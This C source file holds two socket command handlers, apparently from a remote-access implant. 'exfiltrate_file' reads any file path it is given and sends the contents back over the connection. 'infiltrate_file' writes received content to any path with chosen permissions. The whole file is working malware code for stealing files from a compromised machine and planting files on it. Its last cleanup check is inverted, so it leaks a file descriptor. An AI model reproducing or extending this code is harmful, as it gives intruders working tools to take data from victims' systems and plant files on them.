#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>

#include "commands.h"
#include "protocol/res.h"
#include "protocol/res_exfiltration.h"
#include "protocol/res_infiltration.h"

void exfiltrate_file(int sockfd, char *path)
{
    struct stat statbuf;
    res_exfiltration response;
    res_status status;
    char *content = NULL;
    off_t file_size = 0;
    int fd = -1;

    status = GOOD;

    printf("File path: %s\n", path);

    // open
    if ((fd = open(path, O_RDONLY)) < 0)
    {
        perror("Error opening file");
        status = OPEN_ERROR;
        goto out;
    }

    // fstat
    if (fstat(fd, &statbuf) < 0)
    {
        perror("Error on fstat");
        status = STAT_ERROR;
        goto out;
    }

    file_size = statbuf.st_size;
    printf("File size: %ld\n", file_size);

    // malloc
    if (!(content = malloc(file_size)))
    {
        perror("Failed to allocate memory");
        exit(EXIT_FAILURE);
    }

    memset(content, 0, file_size);

    // write
    if (read(fd, content, file_size) < 0)
    {
        perror("Failed to read from file");
        status = READ_ERROR;
        file_size = 0;
    }

out:
    res_exfiltration__init(&response, status, status != GOOD ? errno : 0, content, file_size);

    // send
    write_res(sockfd, (res *) &response);

    res_exfiltration__destroy(&response);

    if (fd >= 0) close(fd);

    free(content);
    content = NULL;
}

void infiltrate_file(int sockfd, char *path, char *content, size_t size, int perm)
{
    res_infiltration response;
    res_status status = GOOD;
    int newfd;

    // open
    if ((newfd = open(path, O_WRONLY | O_CREAT, perm)) < 0)
    {
        perror("Error opening file");
        status = OPEN_ERROR;
        goto out;
    }

    // write
    if (write(newfd, content, size) < 0)
    {
        perror("Error writing to file");
        status = WRITE_ERROR;
    }

out:
    res_infiltration__init(&response, status, status != GOOD ? errno : 0);

    // send
    write_res(sockfd,  (res *) &response);

    res_infiltration__destroy(&response);

    if (newfd <= 0) close(newfd);
}
